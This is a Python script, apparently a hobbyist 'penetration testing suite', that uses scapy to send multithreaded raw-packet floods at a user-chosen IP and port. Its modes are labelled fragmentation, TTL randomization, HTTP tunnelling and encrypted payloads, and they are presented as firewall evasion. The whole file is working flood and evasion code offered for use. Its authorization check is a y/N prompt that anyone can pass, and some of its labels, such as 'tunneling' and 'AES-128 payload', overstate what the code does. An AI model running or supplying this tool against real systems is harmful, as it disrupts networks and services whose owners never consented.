#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import threading
from scapy.all import *
from cryptography.fernet import Fernet

# Enhanced ANSI Colors
COLORS = {
    "GREEN": "\033[92m",
    "RED": "\033[91m",
    "CYAN": "\033[96m",
    "YELLOW": "\033[93m",
    "BOLD": "\033[1m",
    "RESET": "\033[0m"
}

NAME = "Sujal Lamichhane"
EVASION_TECHNIQUES = {
    1: "Fragmented Packet Attack",
    2: "TTL Manipulation",
    3: "HTTP Protocol Tunneling",
    4: "Encrypted Payload Delivery"
}

def print_warning():
    os.system("clear")
    warning = f"""
{COLORS['RED']}{COLORS['BOLD']}
##############################################################################
#  WARNING: STRICTLY FOR AUTHORIZED PENETRATION TESTING ONLY!                #
#  UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL. COMPLY WITH ALL LAWS.          #
##############################################################################
{COLORS['RESET']}"""
    print(warning)
    time.sleep(3)

def print_hacker_banner():
    """Display a hacker-themed banner."""
    os.system("clear")
    banner = f"""
{COLORS['GREEN']}{COLORS['BOLD']}
  ______     ______     ______     ______     ______     ______     ______
 /      \   /      \   /      \   /      \   /      \   /      \   /      \
/$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  |
$$ |__$$ | $$ |  $$/  $$ |__$$ | $$ |__$$ | $$ |  $$/  $$ |__$$ | $$ |  $$/
$$    $$<  $$ |      $$    $$<  $$    $$<  $$ |      $$    $$<  $$ |  $$/
$$$$$$$  | $$ |      $$$$$$$  | $$$$$$$  | $$ |      $$$$$$$  | $$ |  $$/
$$ |  $$ | $$ |  $$  $$ |  $$ | $$ |  $$ | $$ |  $$  $$ |  $$ | $$ |  $$/
$$ |  $$ | $$ |  $$  $$ |  $$ | $$ |  $$ | $$ |  $$  $$ |  $$ | $$ |  $$/
$$/   $$/  $$/   $$/  $$/   $$/  $$/   $$/  $$/   $$/  $$/   $$/  $$/   $$/
{COLORS['RESET']}
{COLORS['CYAN']}Welcome to KALI DADA's Advanced Penetration Testing Suite{COLORS['RESET']}
"""
    print(banner)
    print(f"{COLORS['YELLOW']}Created by: {NAME}{COLORS['RESET']}")
    print(f"{COLORS['CYAN']}Website: sujallamichhane.com.np{COLORS['RESET']}")
    print(f"{COLORS['CYAN']}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{COLORS['RESET']}\n")
    time.sleep(1)

class AdvancedFirewallEvader:
    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.active = True
        self.packet_count = 0
        self.rate_limit = 1000  # Packets per second

    def _generate_legitimate_traffic(self):
        """Generate realistic-looking network traffic"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        return f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n".encode()

    def _fragmented_attack(self):
        """IP fragmentation evasion technique"""
        payload = self._generate_legitimate_traffic()
        frags = fragment(IP(dst=self.target)/UDP(dport=self.port)/payload)
        return frags

    def _ttl_evasion(self):
        """Randomize TTL values to bypass hop-count filters"""
        return random.randint(32, 255)

    def _http_tunneling(self):
        """Tunnel payloads through HTTP traffic"""
        http_payload = self._generate_legitimate_traffic()
        return IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=80)/http_payload

    def _encrypted_payload(self):
        """AES-128 encrypted payload delivery"""
        data = str(random.getrandbits(256)).encode()
        return self.cipher.encrypt(data)

    def _send_packets(self, technique):
        """Core packet transmission logic"""
        start = time.time()
        while self.active and (time.time() - start < self.duration):
            try:
                if technique == 1:
                    send(self._fragmented_attack(), verbose=0)
                elif technique == 2:
                    pkt = IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=self.port)
                    send(pkt, verbose=0)
                elif technique == 3:
                    send(self._http_tunneling(), verbose=0)
                elif technique == 4:
                    pkt = IP(dst=self.target)/TCP(dport=self.port)/self._encrypted_payload()
                    send(pkt, verbose=0)

                self.packet_count += 1
                time.sleep(1/self.rate_limit + random.uniform(-0.001, 0.001))

            except Exception as e:
                print(f"{COLORS['RED']}Error: {e}{COLORS['RESET']}")

    def start_attack(self, technique, threads=5):
        """Multi-threaded attack execution"""
        print(f"{COLORS['YELLOW']}Initializing {EVASION_TECHNIQUES[technique]}...{COLORS['RESET']}")
        for _ in range(threads):
            threading.Thread(target=self._send_packets, args=(technique,)).start()

    def stop_attack(self):
        """Graceful termination"""
        self.active = False
        print(f"{COLORS['CYAN']}\nAttack concluded. Total packets transmitted: {self.packet_count}{COLORS['RESET']}")

def main_menu():
    """Interactive menu system"""
    print(f"{COLORS['GREEN']}{COLORS['BOLD']}")
    print("KALI DADA Advanced Penetration Testing Suite")
    print(f"{COLORS['RESET']}")
    print("Available Evasion Techniques:")
    for num, name in EVASION_TECHNIQUES.items():
        print(f"{COLORS['CYAN']}[{num}] {name}{COLORS['RESET']}")

    choice = int(input("\nSelect technique (1-4): "))
    target = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    duration = int(input("Test duration (seconds): "))

    return choice, target, port, duration

def authorization_check():
    """Ethical compliance verification"""
    confirm = input(f"{COLORS['RED']}Do you have written authorization for this test? (y/N): {COLORS['RESET']}")
    if confirm.lower() != 'y':
        print(f"{COLORS['RED']}Authorization required. Exiting...{COLORS['RESET']}")
        sys.exit(0)

if __name__ == "__main__":
    print_warning()
    print_hacker_banner()
    authorization_check()

    if os.geteuid() != 0:
        print(f"{COLORS['RED']}Root privileges required for raw socket operations{COLORS['RESET']}")
        sys.exit(1)

    technique, target, port, duration = main_menu()
    evader = AdvancedFirewallEvader(target, port, duration)

    try:
        evader.start_attack(technique)
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        evader.stop_attack()
